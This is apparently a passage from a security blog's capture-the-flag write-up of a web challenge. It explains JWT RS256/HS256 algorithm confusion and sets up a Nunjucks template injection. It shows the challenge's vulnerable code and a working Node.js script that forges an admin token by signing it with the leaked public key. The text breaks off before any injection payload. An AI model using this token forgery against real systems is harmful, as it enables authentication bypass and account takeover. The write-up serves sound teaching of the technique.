<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge" /><meta name="author" content="Jack Maginnes (stigward)" /><meta property="og:locale" content="en" /><meta name="description" content="Naughty Or Nice Web Challenge" /><meta property="og:description" content="Naughty Or Nice Web Challenge" /><link rel="canonical" href="https://stigward.github.io/posts/naughty-or-nice-web-chal/" /><meta property="og:url" content="https://stigward.github.io/posts/naughty-or-nice-web-chal/" /><meta property="og:site_name" content="Stigward’s Security Journal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-09T20:33:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge" /><meta name="twitter:site" content="@_stigward" /><meta name="twitter:creator" content="@_stigward" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jack Maginnes (stigward)","url":"https://github.com/stigward/"},"dateModified":"2021-12-09T20:33:00-07:00","datePublished":"2021-12-09T20:33:00-07:00","description":"Naughty Or Nice Web Challenge","headline":"JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://stigward.github.io/posts/naughty-or-nice-web-chal/"},"url":"https://stigward.github.io/posts/naughty-or-nice-web-chal/"}</script><title>JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge | Stigward's Security Journal</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/new_favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/new_favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/new_favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/new_favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/new_favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stigward's Security Journal"><meta name="application-name" content="Stigward's Security Journal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/new_favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/profile.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stigward's Security Journal</a></div><div class="site-subtitle font-italic">Bug Creator and Exploiter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/stigward" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_stigward" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['stigward.research','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1639107180" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 9, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/stigward/">Jack Maginnes (stigward)</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1240 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h1 id="naughty-or-nice-web-challenge">Naughty Or Nice Web Challenge</h1><h2 id="tldr"><span class="mr-2">TL;DR:</span><a href="#tldr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Getting the flag on this challenge requires two separate steps. First, we must obtain access to the <code class="language-plaintext highlighter-rouge">admin</code> account by exploiting a flaw in the JWT verification process. Once inside the <code class="language-plaintext highlighter-rouge">admin</code> account, we are able to edit the “Naughty and Nice” list displayed on homepage. We can leverage a Server Side Template Injection (SSTI) vulnerability to obtain remote code execution and read the flag.</p><h2 id="recon"><span class="mr-2">Recon:</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Navigating to the site, we are greeted with a “Naughty Or Nice” list and the option to navigate to a sign-in page.</p><p><img data-src="/assets/img/img_non/homepage.png" alt="naughty_nice_list" data-proofer-ignore></p><p>The sign-in page allows us to register for an account and use our credentials to login. Once logged in, we are redirected to the <code class="language-plaintext highlighter-rouge">/dashboard</code> endpoint. This endpoint displays a message saying that we “shall not pass”.</p><p><img data-src="/assets/img/img_non/unauth_dashboard.png" alt="unauth_dashboard" data-proofer-ignore></p><p>A quick glance at the code in <code class="language-plaintext highlighter-rouge">/challenge/routes/index.js</code> shows the following for a the <code class="language-plaintext highlighter-rouge">/dashboard</code> endpoint:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nx">router</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/dashboard</span><span class="dl">"</span><span class="p">,</span> <span class="nx">AuthMiddleware</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nx">db</span>
    <span class="p">.</span><span class="nx">getUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">user</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin.html</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">dashboard.html</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="nx">user</span> <span class="p">});</span>
    <span class="p">})</span>
    <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">"</span><span class="s2">Something went wrong!</span><span class="dl">"</span><span class="p">)));</span>
<span class="p">});</span>
</pre></table></code></div></div><p>This shows that if we are the <code class="language-plaintext highlighter-rouge">admin</code> user, then we will get routed to the Admin dashboard. Otherwise we recieve unauthorized page shown above.</p><h2 id="getting-admin"><span class="mr-2">Getting Admin:</span><a href="#getting-admin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Once logged in, we get a JWT token.</p><p><img data-src="/assets/img/img_non/dashboard_cookie.png" alt="jwt" data-proofer-ignore></p><p>Using <a href="https://jwt.io">jwt.io</a> we can see in the decoded JWT that it is using <code class="language-plaintext highlighter-rouge">RS256</code> and the data section contains our username and a public key.</p><p><img data-src="/assets/img/img_non/jwt.png" alt="jwt_decode" data-proofer-ignore></p><p>Back in the code base, we find <code class="language-plaintext highlighter-rouge">JWTHelper.js</code> in the <code class="language-plaintext highlighter-rouge">/challenge/helpers/</code> directory. It contains the code to both create and verify the JWT tokens the web-app uses.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">NodeRSA</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-rsa</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">keyPair</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NodeRSA</span><span class="p">({</span><span class="na">b</span><span class="p">:</span> <span class="mi">512</span><span class="p">}).</span><span class="nx">generateKeyPair</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">publicKey</span> <span class="o">=</span> <span class="nx">keyPair</span><span class="p">.</span><span class="nx">exportKey</span><span class="p">(</span><span class="dl">'</span><span class="s1">public</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="nx">keyPair</span><span class="p">.</span><span class="nx">exportKey</span><span class="p">(</span><span class="dl">'</span><span class="s1">private</span><span class="dl">'</span><span class="p">)</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
	<span class="k">async</span> <span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">data</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="p">{</span><span class="na">pk</span><span class="p">:</span><span class="nx">publicKey</span><span class="p">});</span>
		<span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">privateKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithm</span><span class="p">:</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span> <span class="p">}))</span>
	<span class="p">},</span>
	<span class="k">async</span> <span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}));</span>
	<span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><h3 id="jwt-signing"><span class="mr-2">JWT Signing:</span><a href="#jwt-signing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Lets break down the <code class="language-plaintext highlighter-rouge">sign</code> function first. It gets passed a data parameter which, looking back at the <code class="language-plaintext highlighter-rouge">/routes/index.js</code>, we see in the handler for a POST request to the <code class="language-plaintext highlighter-rouge">/login</code> endpoint has the following format:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="na">username</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="p">})</span>
</pre></table></code></div></div><p>On the first line of the function, we see the public key is added to the data object. Next, the <code class="language-plaintext highlighter-rouge">sign</code> function from the <code class="language-plaintext highlighter-rouge">jsonwebtoken</code> package called. Referring to the documentation, this has a function signature of <code class="language-plaintext highlighter-rouge">jwt.sign(payload, secretOrPrivateKey, [options, callback])</code>, and we are therefore returning a JWT token that has our username and public key as the data, signed by a private key known only to the server, using the <code class="language-plaintext highlighter-rouge">RS256</code> algorithm. Seems fairly secure.</p><h3 id="jwt-verify"><span class="mr-2">JWT Verify:</span><a href="#jwt-verify" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Next lets take a look at <code class="language-plaintext highlighter-rouge">verify</code>. Here we are given a token as the parameter and return the result of the <code class="language-plaintext highlighter-rouge">verify</code> function from the <code class="language-plaintext highlighter-rouge">jsonwebtoken</code> package. Again referencing the documentation, we see that <code class="language-plaintext highlighter-rouge">jsonwebtoken</code>’s verify function has the following function signature: <code class="language-plaintext highlighter-rouge">jwt.verify(token, secretOrPublicKey, [options, callback])</code>. This lines up with what we would expect, as we see this function being passed our JWT token and the server’s public key. However, in our code base, we see the <code class="language-plaintext highlighter-rouge">options</code> parameter can verify a token that uses <strong>either</strong> <code class="language-plaintext highlighter-rouge">RS256</code> or <code class="language-plaintext highlighter-rouge">HS256</code>.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}));</span>
</pre></table></code></div></div><h3 id="creating-an-admin-jwt"><span class="mr-2">Creating an Admin JWT:</span><a href="#creating-an-admin-jwt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Based on what we observed above, we now have all the information we need to create a verified <code class="language-plaintext highlighter-rouge">admin</code> JWT token. The public token is known to us, as it is provided within the <code class="language-plaintext highlighter-rouge">data</code> section of the JWT. Within the <code class="language-plaintext highlighter-rouge">jwt.verify</code> function, the public key is supplied as the <code class="language-plaintext highlighter-rouge">secretOrPublicKey</code> parameter. When the JWT header specifies that the algorithm is <code class="language-plaintext highlighter-rouge">RS256</code>, <code class="language-plaintext highlighter-rouge">jwt.verify</code> interprets the <code class="language-plaintext highlighter-rouge">secretOrPublicKey</code> parameter as a public key. However, if the JWT specifies the algorithm <code class="language-plaintext highlighter-rouge">HS256</code> in the header, then the <code class="language-plaintext highlighter-rouge">jwt.verify</code> function interprets the <code class="language-plaintext highlighter-rouge">secretOrPublicKey</code> as a secret! Thus if a token using <code class="language-plaintext highlighter-rouge">HS256</code> and signed by our public key was passed to the <code class="language-plaintext highlighter-rouge">verify</code> function, it would pass!</p><p>This <code class="language-plaintext highlighter-rouge">verify</code> function is called in AuthMiddleware like so:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>	<span class="k">return</span> <span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">)</span>
		<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">username</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="nx">req</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
			<span class="nx">next</span><span class="p">();</span>
		<span class="p">})</span>
		<span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
			<span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logout</span><span class="dl">'</span><span class="p">);</span>
		<span class="p">});</span>

</pre></table></code></div></div><p>So we can see, once the JWT is verified, the logged in user is determined by the <code class="language-plaintext highlighter-rouge">username</code> field in the data section of the JWT.</p><p>Therefore, we can use the following script to create an <code class="language-plaintext highlighter-rouge">admin</code> JWT:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">publicKey</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s2">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCKM9IX5ZlUs8hWTEa75</span><span class="se">\n</span><span class="s2">eu6mU09aoHm5jd36mDjaopQ8alaWcHykhVXXsd9Dfp+m86cV4zIbmH4FnZGw2wQT</span><span class="se">\n</span><span class="s2">PEv824kR4amWL9X2/7TCu6jgM0SQuA+E7KJvMJTf8ycLqdwx3TQFQVAE35zzlvAw</span><span class="se">\n</span><span class="s2">+MdONz1uQWXh2f6tz6oT+eD/CLd5rJRjxVyraykECcYBDAjOtOjU5NcnTiwU1t2z</span><span class="se">\n</span><span class="s2">J6kOkPlG6t7f5zJ8QnHFByIRDKqsRjCo/2cIdLToBaINt85lZy0j5EyWRM+Sfk6b</span><span class="se">\n</span><span class="s2">NG+CCmR7v1dE2dUIJ5IeXqQ/KSyOxSV0RNbtp9f5pwilaOG+gFeAPAxW0B3PS/cQ</span><span class="se">\n</span><span class="s2">eQIDAQAB</span><span class="se">\n</span><span class="s2">-----END PUBLIC KEY-----</span><span class="dl">"</span>

<span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="dl">'</span><span class="s1">username</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">data</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="p">{</span><span class="na">pk</span><span class="p">:</span><span class="nx">publicKey</span><span class="p">});</span>
<span class="nx">key</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithm</span><span class="p">:</span><span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span> <span class="p">})</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-src="/assets/img/img_non/admin_jwt.png" alt="admin_jwt" data-proofer-ignore></p><p>If we decode our new JWT, we now see the following: <img data-src="/assets/img/img_non/admin_decode.png" alt="admin_decode" data-proofer-ignore></p><p>Go back to the web-app, and set our cookie to the new JWT.</p><p><img data-src="/assets/img/img_non/set_cookie.png" alt="new_jwt" data-proofer-ignore></p><p>Refresh, and we are in the <code class="language-plaintext highlighter-rouge">admin</code> dashboard! <img data-src="/assets/img/img_non/admin_dashboard.png" alt="admin_dash" data-proofer-ignore></p><h2 id="getting-the-flag"><span class="mr-2">Getting The Flag</span><a href="#getting-the-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now we are in the admin dashboard, but we need full code execution in order to obtain the flag. From the dashboard, we have the ability to edit the “Naughty or Nice” list displayed on the landing page. The card on the landing page that displays the list has a helper, <code class="language-plaintext highlighter-rouge">CardHelpers.js</code> in the <code class="language-plaintext highlighter-rouge">/challenge/helpers/</code> directory.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>
<span class="kd">const</span> <span class="nx">nunjucks</span>   <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">nunjucks</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
	<span class="k">async</span> <span class="nx">generateCard</span><span class="p">(</span><span class="nx">elfList</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
			<span class="k">try</span> <span class="p">{</span>
				<span class="kd">let</span> <span class="nx">NaughtyNames</span> <span class="o">=</span> <span class="nx">NiceNames</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">&lt;br&gt;</span><span class="dl">'</span><span class="p">;</span>
				<span class="k">for</span><span class="p">(</span><span class="nx">elfData</span> <span class="k">of</span> <span class="nx">elfList</span><span class="p">)</span> <span class="p">{</span>
					<span class="k">if</span> <span class="p">(</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">naughty</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
						<span class="nx">NaughtyNames</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">NaughtyNames</span><span class="p">}</span><span class="s2">\n</span><span class="p">${</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">elf_name</span><span class="p">}</span><span class="s2">&lt;br&gt;`</span><span class="p">;</span>
					<span class="p">}</span>
					<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">type</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">nice</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
						<span class="nx">NiceNames</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">NiceNames</span><span class="p">}</span><span class="s2">\n</span><span class="p">${</span><span class="nx">elfData</span><span class="p">.</span><span class="nx">elf_name</span><span class="p">}</span><span class="s2">&lt;br&gt;`</span><span class="p">;</span>
					<span class="p">}</span>
				<span class="p">}</span>
				<span class="nx">card</span> <span class="o">=</span> <span class="s2">`
					{% extends "card.html" %}}
					{% block card %}
					&lt;div class="card"&gt;
						&lt;div class="card-page cart-page-front"&gt;
							&lt;div class="card-page cart-page-outside"&gt;&lt;/div&gt;
							&lt;div class="card-page cart-page-inside"&gt;
							&lt;p&gt;&lt;span class='nheader green'&gt;Nice List&lt;/span&gt;
								</span><span class="p">${</span><span class="nx">NiceNames</span><span class="p">}</span><span class="s2">
							&lt;/p&gt;
							&lt;/div&gt;
						&lt;/div&gt;
